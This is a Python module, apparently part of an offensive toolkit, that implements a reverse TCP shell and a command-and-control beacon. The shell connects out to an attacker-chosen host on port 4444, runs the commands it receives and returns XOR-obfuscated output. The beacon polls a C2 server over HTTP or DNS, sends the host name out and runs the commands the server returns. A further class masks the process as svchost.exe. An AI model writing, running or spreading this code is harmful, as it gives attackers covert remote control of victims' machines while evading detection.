"""
RPC Shell/Beacon - Enhancement #3
Reverse shell and beacon functionality via RPC
"""
import socket
import threading
import time
import base64
from typing import Optional, Dict, Callable
from app.core.logger import logger

class RPCShell:
    """RPC-based reverse shell implementation"""
    
    def __init__(self, target_ip: str, target_port: int = 4444):
        self.target_ip = target_ip
        self.target_port = target_port
        self.socket = None
        self.running = False
        self.encryption_key = 0xAA
    
    def start_reverse_shell(self) -> bool:
        """Start reverse TCP shell"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target_ip, self.target_port))
            self.running = True
            
            # Start shell loop in thread
            shell_thread = threading.Thread(target=self._shell_loop)
            shell_thread.daemon = True
            shell_thread.start()
            
            return True
            
        except Exception:
            return False
    
    def _shell_loop(self):
        """Main shell command loop"""
        import subprocess
        
        while self.running:
            try:
                # Receive command
                command = self.socket.recv(1024).decode().strip()
                if not command:
                    break
                
                if command.lower() == 'exit':
                    break
                
                # Execute command
                # SECURITY: commands received over the network must never be
                # passed to a shell.  Use shell=False and split the string so
                # that metacharacters cannot be used for injection.
                try:
                    import shlex
                    result = subprocess.run(
                        shlex.split(command), shell=False, capture_output=True,
                        text=True, timeout=30
                    )
                    output = result.stdout + result.stderr
                except subprocess.TimeoutExpired:
                    output = "Command timed out"
                except Exception as e:
                    output = f"Error: {str(e)}"
                
                # Encrypt and send response
                encrypted_output = self._encrypt_data(output.encode())
                self.socket.send(encrypted_output)
                
            except Exception:
                break
        
        self._cleanup()
    
    def _encrypt_data(self, data: bytes) -> bytes:
        """Simple XOR encryption"""
        return bytes([b ^ self.encryption_key for b in data])
    
    def _cleanup(self):
        """Clean up resources"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)

class RPCBeacon:
    """RPC-based beacon for C2 communication"""
    
    def __init__(self, c2_server: str, beacon_interval: int = 60):
        self.c2_server = c2_server
        self.beacon_interval = beacon_interval
        self.running = False
        self.session_id = None
    
    def start_beacon(self, transport: str = 'http') -> bool:
        """Start beacon communication"""
        try:
            self.running = True
            self.session_id = self._generate_session_id()
            
            if transport == 'http':
                beacon_thread = threading.Thread(target=self._http_beacon_loop)
            elif transport == 'dns':
                beacon_thread = threading.Thread(target=self._dns_beacon_loop)
            else:
                beacon_thread = threading.Thread(target=self._smb_beacon_loop)
            
            beacon_thread.daemon = True
            beacon_thread.start()
            
            return True
            
        except Exception:
            return False
    
    def _http_beacon_loop(self):
        """HTTP-based beacon loop"""
        import urllib.request
        import urllib.parse
        
        while self.running:
            try:
                # Send beacon
                beacon_data = {
                    'session_id': self.session_id,
                    'hostname': socket.gethostname(),
                    'timestamp': int(time.time())
                }
                
                data = urllib.parse.urlencode(beacon_data).encode()
                req = urllib.request.Request(f"http://{self.c2_server}/beacon", data=data)
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    command = response.read().decode().strip()
                    if command and command != 'sleep':
                        self._execute_beacon_command(command)
                
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
            
            time.sleep(self.beacon_interval)
    
    def _dns_beacon_loop(self):
        """DNS-based beacon loop (simplified)"""
        while self.running:
            try:
                # DNS beacon via TXT record queries
                import socket
                beacon_query = f"{self.session_id}.{self.c2_server}"
                socket.gethostbyname(beacon_query)
                
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
            
            time.sleep(self.beacon_interval)
    
    def _smb_beacon_loop(self):
        """SMB-based beacon loop"""
        while self.running:
            try:
                # SMB beacon via named pipe
                pipe_name = f"\\\\{self.c2_server}\\pipe\\beacon_{self.session_id}"
                # Simplified SMB beacon implementation
                
            except Exception as _exc:
                pass
                logger.debug("Suppressed exception", exc_info=True)
            
            time.sleep(self.beacon_interval)
    
    def _execute_beacon_command(self, command: str):
        """Execute command received from beacon.
        
        SECURITY: shell=False prevents injection via shell metacharacters in
        commands received from the C2 server.
        """
        try:
            import subprocess
            import shlex
            result = subprocess.run(
                shlex.split(command), shell=False, capture_output=True, text=True, timeout=30
            )
            # Send result back to C2 (implementation depends on transport)
            
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _generate_session_id(self) -> str:
        """Generate unique session ID"""
        import random
        import string
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    def stop_beacon(self):
        """Stop beacon communication"""
        self.running = False

# Service disguise functionality
class ServiceDisguise:
    """Disguise RPC shell/beacon as legitimate service"""
    
    @staticmethod
    def disguise_as_svchost() -> Dict:
        """Disguise process as svchost.exe"""
        import os
        import sys
        
        disguise_info = {
            'original_name': os.path.basename(sys.executable),
            'disguised_name': 'svchost.exe',
            'process_name_changed': False
        }
        
        try:
            # Basic process name obfuscation
            sys.argv[0] = 'svchost.exe'
            disguise_info['process_name_changed'] = True
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        return disguise_info

# Integration function
def integrate_rpc_shell(rpc_results: Dict, shell_config: Dict = None) -> Dict:
    """Integrate RPC shell capabilities with enumeration results"""
    if not shell_config:
        shell_config = {
            'reverse_shell_port': 4444,
            'beacon_interval': 60,
            'transport': 'http'
        }
    
    rpc_results['shell_capabilities'] = {
        'reverse_tcp_shell': True,
        'http_beacon': True,
        'dns_beacon': True,
        'smb_beacon': True,
        'encrypted_communication': True,
        'service_disguise': True,
        'config': shell_config
    }
    
    return rpc_results